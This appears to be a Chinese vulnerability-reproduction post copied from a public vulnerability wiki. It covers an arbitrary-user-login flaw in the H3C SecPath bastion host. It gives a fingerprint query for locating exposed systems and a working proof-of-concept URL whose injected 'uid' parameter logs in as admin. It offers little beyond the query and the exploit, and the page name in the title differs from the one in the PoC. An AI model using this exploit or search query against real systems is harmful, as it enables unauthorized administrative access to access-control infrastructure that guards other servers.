---
title: "H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞"
date: 2026-10-18 09:14:33
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "H3C"
tags:
  - "H3C"
  - "漏洞复现"
---
## 漏洞描述

H3C SecParh堡垒机 get_detail_view.php 存在任意用户登录漏洞

与齐治堡垒机出现的漏洞相似

## 漏洞影响

```
H3C SecParh堡垒机
```

## 网络测绘

```
app="H3C-SecPath-运维审计系统" && body="2018"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202091826937.png)



POC验证的Url为

```plain
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202091826692.png)

成功获取admin权限



## 

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/H3C-SecParh%E5%A0%A1%E5%9E%92%E6%9C%BA-get_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
